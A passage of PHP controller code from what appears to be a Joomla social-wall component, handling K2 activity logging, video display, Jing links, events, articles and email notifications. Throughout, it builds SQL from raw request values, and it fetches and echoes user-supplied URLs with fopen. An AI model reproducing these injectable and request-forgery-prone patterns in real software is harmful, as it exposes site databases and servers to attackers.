						$wall->user_name	= '';
						$wall->avatar		= '';
						$wall->message		= JText::sprintf ( 'K2_JOMWALL_ARTICLE_POST_TITLE', '<a href="' . $itemurl . '">' . $itemtitle . '</a>');
						$wall->reply		= 0;
						$wall->is_read		= 0;
						$wall->is_pm		= 0;
						$wall->is_reply		= 0;
						$wall->posted_id	= NULL;
						$wall->wall_date	= time();
			
						// store wall to database
						if (!$wall->store()){				
							$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
						}
					}
						$query="select max(id) from #__k2_items ";
						$db->SetQuery($query);
						$lastk2articleid = $db->loadResult();
						$sql="update `#__awd_wall_k2comment_act` set lastk2articleid='".$lastk2articleid."'";
						$db->setQuery( $sql );
						if (!$db->query())
						{
							return JError::raiseWarning( 500, $db->getError() );
						}
				} // end of if($k2article==1)
			// k2 article log end here ********************************************
			
			
			
			// for k2 comment activity log *******************************************
			if($k2comment==1)
			{
					$query="select * from #__k2_comments where published=1  and id > ".$lastactivityid." order by id desc ";
					$db->SetQuery($query);
					$k2_activities = $db->loadObjectList();
					$k2_lastactivityid=$lastactivityid;
			
					for($i=0;$i<count($k2_activities);$i++)
					{
						$userID =$k2_activities[$i]->userID;
						$itemID=$k2_activities[$i]->itemID;
						$userName=$k2_activities[$i]->userName;
						
						$query="select title  from #__k2_items where id=".$itemID;
						$db->SetQuery($query);
						$itemtitle = $db->loadResult();
						$query="select alias  from #__k2_items where id=".$itemID;
						$db->SetQuery($query);
						$alias = $db->loadResult();
						$query="select catid  from #__k2_items where id=".$itemID;
						$db->SetQuery($query);
						$catid = $db->loadResult();
						
						$itemurl='index.php?option=com_k2&view=item&id='.$itemID.':'.$alias.'&Itemid='.$k2itemId;
						
						$wall 				=& JTable::getInstance('Wall', 'Table');						
						$wall->user_id		= $userID ;
						$wall->group_id		=  NULL;
						$wall->type			= 'text';
						$wall->commenter_id	= $userID ;
						$wall->user_name	= '';
						$wall->avatar		= '';
						$wall->message		= JText::sprintf ( 'K2_JOMWALL_ACTIVITY_POST_TITLE', '<a href="' . $itemurl . '">' . $itemtitle . '</a>');
						$wall->reply		= 0;
						$wall->is_read		= 0;
						$wall->is_pm		= 0;
						$wall->is_reply		= 0;
						$wall->posted_id	= NULL;
						$wall->wall_date	= time();
			
						// store wall to database
						if (!$wall->store()){				
							$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
						}
			
					}
					
					$query="select max(id) from #__k2_comments ";
					$db->SetQuery($query);
					$lastactivityid = $db->loadResult();
					$sql="update `#__awd_wall_k2comment_act` set `lastactivityid`='".$lastactivityid."'";
					$db->setQuery( $sql );
					if (!$db->query())
					{
						return JError::raiseWarning( 500, $db->getError() );
					}
				} // end of if($k2comment==1)
				
				// k2 activity log end here **************************************************

		
		} // k2article==1 || $k2comment==1
		
	  } // end of if(file_exists(JPATH_SITE . '/components/com_k2/k2.php'))
		
		exit;	
	}
	
	function showvideo($wallid,$type,$videoid)
	{
		$wallid=$_REQUEST['wallid'];
		$type=$_REQUEST['type'];
		$videoid=$_REQUEST['videoid'];
		$user	 = &JFactory::getUser();		
		$db =& JFactory::getDBO();
		
		$query = "SELECT path  FROM #__awd_wall_videos WHERE wall_id=".$wallid;
		$db->setQuery($query);
		$vLink = $db->loadResult();
		//echo $vLink ;
			require_once (JPATH_COMPONENT . DS . 'libraries' . DS . 'avideo.php');
			if(!empty($vLink))
			{ 
				$AVideo 	= new AVideo($user->id);
				$videoObj 	= $AVideo->getProvider($vLink);
				$videoObj->init($vLink);
				if ($videoObj->isValid())
				{
				//echo $videoObj->getId();
					echo $videoObj->getViewHTML($videoObj->getId());
					//echo  $videoObj->getId();
				}
				
			}
		exit;
	}
	function getjincontent()
	{
		$id=$_REQUEST['id'];
		$db =& JFactory::getDBO();
		$query = "SELECT jing_link  FROM #__awd_wall_jing WHERE id=".$id;
		$db->setQuery($query);
		$jing_link = $db->loadResult();
		$file = fopen($jing_link, "r"); 
		$data = '';
		
		if (!$file)
		{
			exit("Problem occured");
		} 
		while (!feof($file))
		{
			$data .= fgets($file, 1024);
		}
		echo $data;
		exit;
	}
	
	function getjinthumb()
	{
		$id=$_REQUEST['id'];
		$db =& JFactory::getDBO();
		$query = "SELECT jing_link  FROM #__awd_wall_jing WHERE id=".$id;
		$db->setQuery($query);
		$jing_link = $db->loadResult();
		$file = fopen($jing_link, "r"); 
		$data = '';
		
		if (!$file)
		{
			exit("Problem occured");
		} 
		while (!feof($file))
		{
			$data .= fgets($file, 1024);
		}
		
		preg_match_all('/<object[0-9 a-z_?*\&\;\=\":\-\/\.#\,<>\\n\\r\\t]+<\/object>/smi', $data, $matches);
		if($matches[0][0])
		{				
			$imageintextpos1=strpos( $matches[0][0],"thumb=");
			$imageintextpos2=strpos( substr($matches[0][0],$imageintextpos1),"&");
			$imagesrc=substr($matches[0][0],$imageintextpos1+6,$imageintextpos2-6);
		}
		else
		{
		preg_match_all('/<img class="embeddedObject"[0-9 a-z_?*\&\;\=\":\-\/\.#\,<>\\n\\r\\t]+\/>/smi', $data, $matches);
			$imageintextpos1=strpos( $matches[0][0],"src=");
			$imageintextpos2=strpos( substr($matches[0][0],$imageintextpos1),'width');
			$imagesrc=substr($matches[0][0],$imageintextpos1+5,$imageintextpos2-7);
		}
		echo '<img src="'.$imagesrc.'" width="112" height="85" />';
		exit;
	}
	
	function addJing()
	{
		$user = &JFactory::getUser();
		$wuid = JRequest::getInt('wuid', 0);
		if($wuid == 0) $wuid = $user->id;
		$groupId = JRequest::getInt('groupid', NULL);
		$itemId = AwdwallHelperUser::getComItemId();
		$db =& JFactory::getDBO();
	if((int)$user->id){
	require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');	
	$awd_jing_title=JRequest::getVar('awd_jing_title', '');							
	$awd_jing_link= JRequest::getVar('awd_jing_link', '');
	$awd_jing_description= JRequest::getVar('awd_jing_description', '');
	if($awd_jing_title != ''){	$awd_jing_link= JRequest::getVar('awd_jing_link', '');
		// save into wall table first
		$wall = &JTable::getInstance('Wall', 'Table');
		$wall->user_id 		= $wuid;					
		$wall->type			= 'jing';
		$wall->commenter_id	= $user->id;
		$wall->user_name	= '';
		$wall->avatar		= '';
		$wall->message		= '';
		$wall->reply		= 0;
		$wall->is_read		= 0;
		$wall->is_pm		= 0;
		$wall->is_reply		= 0;
		$wall->posted_id	= NULL;
		$wall->wall_date	= NULL;
			   // store wall to database
		if (!$wall->store()){				
		$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));	
		}
			$wallId = $wall->id;				
			$sql = 'INSERT INTO #__awd_wall_jing(wall_id, jing_title,jing_link,jing_description) VALUES("'.$wallId .'","' . $awd_jing_title . '", "' . $awd_jing_link . '","' . $awd_jing_description . '")';
				$db->setQuery($sql);
				$db->query();
			}
			echo '{"wid_tmp": "' . $wallId .  '"}';
		}
			exit;
		
	}
	
	public function addevent()
	{
		$mainframe= JFactory::getApplication();
		$user = &JFactory::getUser();		
		$wuid = JRequest::getInt('wuid', 0);
		if($wuid == 0) $wuid = $user->id;
		$groupId = JRequest::getInt('groupid', NULL);		
		$itemId = AwdwallHelperUser::getComItemId();		
		$db =& JFactory::getDBO();
		if((int)$user->id){
			require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');					
			$arrExt 	= explode(',', AwdwallHelperUser::getImageExt());
			$title 	= JRequest::getVar('awd_event_title', '');			
			$location 	= JRequest::getVar('awd_event_location', '');
						
			$start_date 	= JRequest::getVar('startdate', '');
			$start_datearray=explode("-",$start_date);
			$newstartdate=$start_datearray[2].' '.$start_datearray[1].' '.$start_datearray[0];	
					
			$end_date	= JRequest::getVar('enddate', '');
			$end_datearray=explode("-",$end_date);	
			$newenddate=$end_datearray[2].' '.$end_datearray[1].' '.$end_datearray[0];	
			$description	= JRequest::getVar('awd_event_description', '');			
			$starttime_ampm	= JRequest::getVar('starttimeampm', '');			
			$endtime_ampm	= JRequest::getVar('endtimeampm', '');			
			$starttime_hour	= JRequest::getVar('starttimehour', '');			
			$endtime_hour	= JRequest::getVar('endtimehour', '');			
			$starttime_minute	= JRequest::getVar('starttimeminute', '');			
			$endtime_minute	= JRequest::getVar('endtimeminute', '');			
			$event_image 	= JRequest::getVar('awd_event_image', null, 'files', 'array');
			$event_mail	= JRequest::getVar('awd_event_mail', '');			
			$event_starttime[]=$start_date;
			$event_starttime[]=$starttime_hour.":".$starttime_minute;
			$event_starttime[]=$starttime_ampm;
			$start_time=implode( "\n", $event_starttime );
			$event_endtime[]=$end_date;
			$event_endtime[]=$endtime_hour.":".$endtime_minute;
			$event_endtime[]=$endtime_ampm;
			$end_time=implode( "\n", $event_endtime );
			
			$eventdetail=$title.'<br>';
			$eventdetail=$eventdetail.JText::_('LOCATION').':'.$location.'<br>';
			$eventdetail=$eventdetail.JText::_('START TIME').':'.$starttime_minute.':'.$starttime_hour.' '.$starttime_ampm.' '.$newstartdate.'<br>';
			$eventdetail=$eventdetail.JText::_('END TIME').':'.$endtime_minute.':'.$endtime_hour.' '.$endtime_ampm.' '.$newenddate.'<br>';
			$eventdetail=$eventdetail.JText::_('EVENT DESCRIPTION').':'.$description.'<br>';
			
				if($_FILES['awd_event_image']['name'] != ''){
				jimport('joomla.filesystem.file');
				jimport('joomla.filesystem.folder');
				$time = time();
				//Clean up filename to get rid of strange characters like spaces etc
				$fileName = $time . '_' . JFile::makeSafe($_FILES['awd_event_image']['name']);
				$fileName =strtolower( str_replace(' ', '_', $fileName));
				$src 	= $_FILES['awd_event_image']['tmp_name'];
				$dest 	= 'images' . DS . 'awd_events' . DS . $wuid . DS . 'original' . DS . $fileName; 
				if(in_array(strtolower(JFile::getExt($fileName)), $arrExt)){
				
					require_once (JPATH_COMPONENT . DS . 'libraries' . DS . 'class.upload.php');
					$handle = new upload($_FILES['awd_event_image']);
					   if ($handle->uploaded) {
					   
							$filename = preg_replace("/\\.[^.\\s]{3,4}$/", "", $fileName);
							//$filename1 = preg_replace("/\\.[^.\\s]{3,4}$/", "", $fileName);
	
							$folder='images' .  DS . 'awd_events' .DS . $wuid . DS . 'original';
							processthumb($handle,$filename,$folder);
							
							$handle->image_resize          = true;
							$handle->image_ratio_crop      = true;
							$handle->image_x               = 130;
							$handle->image_y               = 130;
							$folder='images' .  DS . 'awd_events' .DS . $wuid . DS . 'thumb';
							processthumb($handle,$filename,$folder);
							
							}
				}else {
					//Redirect and notify user file is not right extension
					$this->setRedirect(JRoute::_('index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
				}
			}
				// save into wall table first
				$wall = &JTable::getInstance('Wall', 'Table');
				$wall->user_id 		= $wuid;					
				$wall->type			= 'event';
				$wall->commenter_id	= $user->id;
				$wall->user_name	= '';
				$wall->avatar		= '';
				$wall->message		= '';
				$wall->reply		= 0;
				$wall->is_read		= 0;
				$wall->is_pm		= 0;
				$wall->is_reply		= 0;
				$wall->posted_id	= NULL;
				$wall->wall_date	= NULL;
				$title 			= ltrim($title);
				$title 			= rtrim($title);
				$description 	= ltrim($description);
				$description 	= rtrim($description);
				$location 	= ltrim($location);
				$location 	= rtrim($location);
				// store wall to database
				if (!$wall->store()){				
					$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));	
				}
				$wallId = $wall->id;				
				$sql = 'INSERT INTO #__awd_wall_events(wall_id, title, location,start_time,end_time,description,image) VALUES("'.$wallId .'","' . $title . '", "' . $location . '", "' . $start_time . '", "' . $end_time . '","' . $description . '","' . $fileName . '")';
				$db->setQuery($sql);
				$db->query();
				$query="select * from #__users where id=".$user->id;
				$db->setQuery($query);
				$sender=$db->loadObjectList();
				$sender=$sender[0];
				$query1='';
				if($event_mail!=0)
				{
				if($event_mail==1)
				{
					$query1="select u.connect_to , v.* from #__awd_connection as u , #__users as v where  u.connect_to=v.id and u.connect_from=".$user->id;
				}
				if($event_mail==2)
				{
					$query1="select * from #__users where id !=".$user->id;
				}
				$db->setQuery($query1);
				$reciever_list=$db->loadObjectList();
			  // mail to user
				$subject=JText::sprintf('SITE EVENT COMING UP',JURI::base());
				//echo $body;
				$count=count($reciever_list);
					for($i=0; $i<$count; $i++)
					{
$itemId = AwdwallHelperUser::getComItemId();
$rName =  AwdwallHelperUser::getDisplayName($reciever_list [$i]->id);
$sName =  AwdwallHelperUser::getDisplayName($user->id);				
$reciverurl=JURI::base().'index.php?option=com_awdwall&view=awdwall&layout=mywall&Itemid='.$itemId;	
			
$sitename=$mainframe->getCfg('fromname');
$subject=JText::sprintf('SITE EVENT COMING UP',$sitename);
$siteaddress=JURI::base();
$useravatarimage=AwdwallHelperUser::getBigAvatar51($user->id);
$emailgreeting=JText::sprintf('COM_COMAWDWALL_EMAIL_GREETING', $rName);
$emailbody=JText::sprintf('COM_COMAWDWALL_EMAIL_BODY_EVENT',$sName,$title);	
$emailtext1=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_VIEW_CONVERSATION');	
$emailtext2=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_SEE_POST');
$emailfooter=JText::sprintf('COM_COMAWDWALL_EMAIL_FOOTER',$siteaddress,$sitename);	

$emailcontent='<table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="font-size:16px;font-family:lucida grande,tahoma,verdana,arial,sans-serif;background:#313131;color:#ffffff;font-weight:bold;vertical-align:baseline;letter-spacing:-0.03em;text-align:left;padding:10px 38px 4px"><a target="_blank" href="'.$siteaddress.'" style="text-decoration:none" title="'.$siteaddress.'"><span style="background:#313131;color:#ffffff;font-weight:bold;font-family:lucida grande,tahoma,verdana,arial,sans-serif;vertical-align:middle;font-size:16px;letter-spacing:-0.03em;text-align:left;vertical-align:baseline"><span class="il">'.$sitename.'</span></span></a></td></tr></tbody></table><table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="border-right:1px solid #ccc;color:#333333;font-size:11px;border-bottom:1px solid #ccc;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;border-top:1px solid #ccc;padding:10px 25px;border-left:1px solid #ccc; background-color:#f7f7f7"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:10px 25px;color:#333333;width:620px"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding-bottom:10px"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td colspan="2" valign="top" style="height:30px;"><span style="font-size:13px;">'.$emailgreeting.'</span></td></tr><tr><td valign="top" style="width:100%;"><span style="font-size:13px">'.$emailbody.'</span></td><td valign="top" style="padding-right:10px;font-size:0px"><a target="_blank" style="color:#3b5998;text-decoration:none" href="'.$reciverurl.'" title="'.$sName.'"><img style="border:0" src="'.$useravatarimage.'"  /></a></td></tr></tbody></table></td></tr><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif"><table cellspacing="0" cellpadding="0" border="0" style="border-collapse:collapse;width:100%"><tbody><tr><td>&nbsp;</td></tr><tr><td style="font-size:13px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:0px;border-left:none;border-right:none;">'.$emailfooter.'</td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table>';
				$body = $emailcontent;				 
						
						$rName =  AwdwallHelperUser::getDisplayName($reciever_list [$i]->id);
						$sName =  AwdwallHelperUser::getDisplayName($user->id);				
						$mailer = & JFactory::getMailer();
						$mailer->setSender(array($mainframe->getCfg('mailfrom'), $mainframe->getCfg('fromname')));
						$mailer->setSubject($subject);
						//$body = JText::sprintf('EMAIL BODY EVENT', $rName, $sName,$title,nl2br($eventdetail), JURI::base(), JURI::base());	
						$mailer->setBody($body);
						$mailer->IsHTML(1);
						$mailer->addRecipient($reciever_list [$i]->email);
						$send =& $mailer->Send();
					}
				}
			echo '{"wid_tmp": "' . $wallId .  '"}';
		}
		exit;
	}
	
	function addEventAttend()
	{			
		$mainframe= JFactory::getApplication();
		$user 		= &JFactory::getUser();			
		$db 		= &JFactory::getDBO();
		$wallId 	= JRequest::getInt('wid', 0);
		$eventId 	= JRequest::getInt('eventId', 0);
		$cId 		= JRequest::getInt('cid', $user->id);
		$status 	= JRequest::getVar('attend_event', '');
		$itemId = AwdwallHelperUser::getComItemId();			
/*echo '<script> alert("'.$status.'");</script>';
exit;
*/
		if((int)$user->id){
		$query='select count(*) as count from #__awd_wall_event_attend  where wall_id='.$wallId.' and user_id='.$user->id;
		$db->setQuery($query);
		$count = $db->loadResult();
		if(!$count)
		{	
			$query = 'INSERT INTO #__awd_wall_event_attend(wall_id, event_id, user_id, status) VALUES(' . $wallId . ', ' . $eventId . ', ' . $user->id . ', ' . $status . ')';
//echo $query;
			$db->setQuery($query);
			// store like to database
			if (!$db->query()){	
				$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main',false),$db->getErrorMsg());
			}
		//send meail to event owner
					$rName =  AwdwallHelperUser::getDisplayName($commenter_id);
					$sName =  AwdwallHelperUser::getDisplayName($user->id);	
					
$itemId = AwdwallHelperUser::getComItemId();
$reciverurl=JURI::base().'index.php?option=com_awdwall&view=awdwall&layout=mywall&Itemid='.$itemId;	
			
$sitename=$mainframe->getCfg('fromname');
$subject=JText::sprintf('EVENT ATTEND NOTIFICATION',$sitename);
$siteaddress=JURI::base();
$useravatarimage=AwdwallHelperUser::getBigAvatar51($user->id);
$emailgreeting=JText::sprintf('COM_COMAWDWALL_EMAIL_GREETING', $rName);
$emailbody=JText::sprintf('COM_COMAWDWALL_EMAIL_BODY_EVENT_ATTEND',$sName,$title);	
$emailtext1=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_VIEW_CONVERSATION');	
$emailtext2=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_SEE_POST');
$emailfooter=JText::sprintf('COM_COMAWDWALL_EMAIL_FOOTER',$siteaddress,$sitename);	

$emailcontent='<table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="font-size:16px;font-family:lucida grande,tahoma,verdana,arial,sans-serif;background:#313131;color:#ffffff;font-weight:bold;vertical-align:baseline;letter-spacing:-0.03em;text-align:left;padding:10px 38px 4px"><a target="_blank" href="'.$siteaddress.'" style="text-decoration:none" title="'.$siteaddress.'"><span style="background:#313131;color:#ffffff;font-weight:bold;font-family:lucida grande,tahoma,verdana,arial,sans-serif;vertical-align:middle;font-size:16px;letter-spacing:-0.03em;text-align:left;vertical-align:baseline"><span class="il">'.$sitename.'</span></span></a></td></tr></tbody></table><table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="border-right:1px solid #ccc;color:#333333;font-size:11px;border-bottom:1px solid #ccc;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;border-top:1px solid #ccc;padding:10px 25px;border-left:1px solid #ccc; background-color:#f7f7f7"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:10px 25px;color:#333333;width:620px"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding-bottom:10px"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td colspan="2" valign="top" style="height:30px;"><span style="font-size:13px;">'.$emailgreeting.'</span></td></tr><tr><td valign="top" style="width:100%;"><span style="font-size:13px">'.$emailbody.'</span></td><td valign="top" style="padding-right:10px;font-size:0px"><a target="_blank" style="color:#3b5998;text-decoration:none" href="'.$reciverurl.'" title="'.$sName.'"><img style="border:0" src="'.$useravatarimage.'"  /></a></td></tr></tbody></table></td></tr><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif"><table cellspacing="0" cellpadding="0" border="0" style="border-collapse:collapse;width:100%"><tbody><tr><td>&nbsp;</td></tr><tr><td style="font-size:13px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:0px;border-left:none;border-right:none;">'.$emailfooter.'</td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table>';
				$body = $emailcontent;				 
					
								
					$mailer = & JFactory::getMailer();
					$mailer->setSender(array($mainframe->getCfg('mailfrom'), $mainframe->getCfg('fromname')));
					$mailer->setSubject($subject);
					//$body = JText::sprintf('EMAIL BODY EVENT ATTEND', $rName, $sName,$title, JURI::base(), JURI::base());	
					$mailer->setBody($body);
					$mailer->IsHTML(1);
					$mailer->addRecipient($email);
					$send =& $mailer->Send();
		}
			$Itemid = AwdwallHelperUser::getComItemId();
		}else{
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId, false), JText::_('Need to login'));
		}
		exit;
	}
	
	function getEventAttend()
	{	
		$db 	= &JFactory::getDBO();
		//$Itemid = AwdwallHelperUser::getComItemId();
		$Itemid = AwdwallHelperUser::getComItemId();
		$wid 	= JRequest::getVar('wid', '');			
		$query 	= 'SELECT count(*) as totalattend FROM #__awd_wall_event_attend WHERE  status=1 and wall_id = ' . (int)$wid . ' ';
		//echo "$query";
				$db->setQuery($query);
				$totalattend = $db->loadResult();
				$query 	= "SELECT * FROM #__awd_wall_event_attend WHERE wall_id = ".(int)$wid." AND status='1' GROUP BY user_id order by rand() limit 5";
				$db->setQuery($query);
				$rows = $db->loadObjectList();
		$user = &JFactory::getUser();
		if(isset($rows[0])){	
		?>
		<div class="whitebox"><font style="font-size:11px;"><?php echo $totalattend.' '.JText::_('People attend this event');?></font>
		  <div class="clearfix">
		<?php foreach($rows as $row){?>
			<div class="subcommentImagebox"><a href="<?php echo JRoute::_('index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid=' . $row->user_id.'&Itemid=' . $Itemid, false);?>">
			<img src="<?php echo AwdwallHelperUser::getBigAvatar32($row->user_id);?>" alt="<?php echo AwdwallHelperUser::getDisplayName($row->user_id);?>" title="<?php echo AwdwallHelperUser::getDisplayName($row->user_id);?>" height="32" width="32" />
			</a>
			</div>
		<?php }?>
		  </div>
		</div>
		<br />
		<?php }	
		exit;
	}
	
	public function addarticle()
	{
		$user = &JFactory::getUser();		
		$wuid = JRequest::getInt('wuid', 0);
		if($wuid == 0) $wuid = $user->id;
		$groupId = JRequest::getInt('groupid', NULL);		
		$itemId = AwdwallHelperUser::getComItemId();		
		$db =& JFactory::getDBO();
		
		$config 		= &JComponentHelper::getParams('com_awdwall');
		$article_img_height 		= $config->get('article_img_height', '84');
		$article_img_width 		= $config->get('article_img_width', '112');
		
		$title 	= JRequest::getVar('awd_article_title', '');			
		$description 	= JRequest::getVar('awd_article_description', '');	
		$description	=ereg_replace("'", "", $description);
		$description	=nl2br($description);
		$loadjomwall 	= JRequest::getVar('loadjomwall', '');
		$catid 	= JRequest::getVar('catid', '');
			
			//$title='uttam test';	
			//$description='uttam test description';
			//$catid 	=2;
		//date_default_timezone_set('Australia/Melbourne');
		$date = date('Y-m-d h:i:s a', time());
				
		if($loadjomwall==1)
		{
			$description=$description.'{loadjomwall}';
		}
		if((int)$user->id){
			require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');					
			$arrExt 	= explode(',', AwdwallHelperUser::getImageExt());
			$article_image 	= JRequest::getVar('awd_article_image', null, 'files', 'array');
				if($article_image['name'] != ''){
				jimport('joomla.filesystem.file');
				jimport('joomla.filesystem.folder');
				$time = time();
				//Clean up filename to get rid of strange characters like spaces etc
				$fileName = $time . '_' . JFile::makeSafe($article_image['name']);
				$fileName = strtolower( str_replace(' ', '_', $fileName));
				$src 	= $article_image['tmp_name'];
				$dest 	= 'images' . DS . 'awd_articles' . DS . $wuid . DS . 'original' . DS . $fileName; 
				if(in_array(strtolower(JFile::getExt($fileName)), $arrExt)){
					
					require_once (JPATH_COMPONENT . DS . 'libraries' . DS . 'class.upload.php');
					$handle = new upload($_FILES['awd_article_image']);
					   if ($handle->uploaded) {
					   
							$filename = preg_replace("/\\.[^.\\s]{3,4}$/", "", $fileName);
							//$filename1 = preg_replace("/\\.[^.\\s]{3,4}$/", "", $fileName);
	
							$folder='images' .  DS . 'awd_articles' .DS . $wuid . DS . 'original';
							processthumb($handle,$filename,$folder);
							
							$handle->image_resize          = true;
							$handle->image_ratio_crop      = true;
							$handle->image_x               = 600;
							$handle->image_y               = 400;
							$folder='images' .  DS . 'awd_articles' .DS . $wuid . DS . 'thumb';
							processthumb($handle,$filename,$folder);
							
							}
					
					
				}else {
					//Redirect and notify user file is not right extension
					$this->setRedirect(JRoute::_('index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid=' . $wuid . '&Itemid=' . $itemId, false));
				}
			}
				
								//get parent_id of article		
				$sql='SELECT asset_id FROM #__categories WHERE id = '.$catid;
				$db->setQuery($sql);
				$parent_id = $db->loadResult();
				$attribs='{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","alternative_readmore":"","article_layout":""}';
				
				$metedata='{"robots":"","author":"","rights":"","xreference":""}';
				$description1='<p>'.$description.'</p>';
				// save into joomla article table first
				$sql="INSERT INTO #__content(`id`, `asset_id`, `title`, `alias`, `introtext`, `fulltext`, `state`,  `catid`, `created`, `created_by`, `created_by_alias`, `modified`, `modified_by`, `checked_out`, `checked_out_time`, `publish_up`, `publish_down`, `images`, `urls`, `attribs`, `version`,  `ordering`, `metakey`, `metadesc`, `access`, `hits`, `metadata`,`featured`,`language`,`xreference`) VALUES('','','" . $title . "','" . $title . "','" . $description1 . "','','1','".$catid."','" . $date . "','" . $user->id . "','','','','','','" . $date . "','','','','".$attribs."','','','','','1','','".$metedata."','','','')";
				
				$db->setQuery($sql);
				$db->query();
				$article_id=$db->insertid();
				
				$name='com_content.article.'.$article_id;
				
				$catname='com_content.category.'.$catid;
				
				//select rgt from #__assets
				$sql='SELECT rgt FROM #__assets WHERE name ="'.$catname.'"';
				$db->setQuery($sql);
				$myRight = $db->loadResult();


				//update rgt in #__assets
				$sql='UPDATE #__assets SET rgt = rgt + 2 WHERE rgt > '.$myRight;
				$db->setQuery($sql);
				$db->query();
				
				//update lft in #__assets
				$sql='UPDATE #__assets SET lft = lft + 2 WHERE lft > '.$myRight;
				$db->setQuery($sql);
				$db->query();
				
				$lft=$myRight+1;
				$rgt=$myRight+2;
				$rules='{"core.delete":[],"core.edit":[],"core.edit.state":[]}';
				//save to joomla jos_assets table
				$sql = "INSERT INTO #__assets(`id`,`parent_id`, `lft`, `rgt`, `level`, `name`, `title`, `rules`) VALUES('','".$parent_id."','".$lft."','".$rgt."','','" . $name . "','" . $title . "','".$rules."')";
				$db->setQuery($sql);
				$db->query();

				$asset_id=$db->insertid();
				
				//update asset_id of #__content
				$sql='UPDATE #__content SET asset_id = '.$asset_id .' '.'WHERE id= '.$article_id;
				$db->setQuery($sql);
				$db->query();
				
				// save into wall table first
				$wall = &JTable::getInstance('Wall', 'Table');
				$wall->user_id 		= $wuid;					
				$wall->type			= 'article';
				$wall->commenter_id	= $user->id;
				$wall->user_name	= '';
				$wall->avatar		= '';
				$wall->message		= '';
				$wall->reply		= 0;
				$wall->is_read		= 0;
				$wall->is_pm		= 0;
				$wall->is_reply		= 0;
				$wall->posted_id	= NULL;
				$wall->wall_date	= NULL;
				$title 			= ltrim($title);
				$title 			= rtrim($title);
				$description 	= ltrim($description);
				$description 	= rtrim($description);
				// store wall to database
				if (!$wall->store()){				
					$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));	
				}
				$wallId = $wall->id;
				//save  to wall_article table
					
				$sql = "INSERT INTO #__awd_wall_article(`wall_id`, `title`, `description`,`image`,`article_id`) VALUES('".$wallId ."','" . $title . "','" . $description . "','" . $fileName . "','" . $article_id . "')";
				$db->setQuery($sql);
				$db->query();
				
/*		echo "<script>alert('".$title."');</script>";	
		exit;		
*/				
			echo '{"wid_tmp": "' . $wallId .  '"}';
			//exit;
		}
		exit;
	}
	
	
	function getnotification()
	{
	
		header("Pragma: no-cache"); 
		global $mainframe;
		$db =& JFactory::getDBO();
		$user = &JFactory::getUser();
		$config 		= &JComponentHelper::getParams('com_awdwall');
		$display_notification = $config->get('display_notification', 1);
		$display_profile_link = $config->get('display_profile_link', 1);
		$strnotification=0;
		if($display_notification)
		{
		
		if($user->id)
		{
			$currenttime=time();
			$currenttime=$currenttime-10;
			
			//$itemId = AwdwallHelperUser::getComItemId();
			$query = "SELECT * FROM #__awd_wall WHERE wall_date >='".$currenttime."' and user_id=".$user->id." and commenter_id!=".$user->id." and type!='friend'";
			//echo $query ;
			$db->setQuery($query);
			$items = $db->loadObjectList();
			//print_r($items);
			$strnotification='';
			$mywallink='index.php?option=com_awdwall&view=awdwall&layout=mywall&Itemid='.AwdwallHelperUser::getComItemId();
			$walllink= 'index.php?option=com_awdwall&view=awdwall&layout=main&wid='.$item->id.'&Itemid='.AwdwallHelperUser::getComItemId();
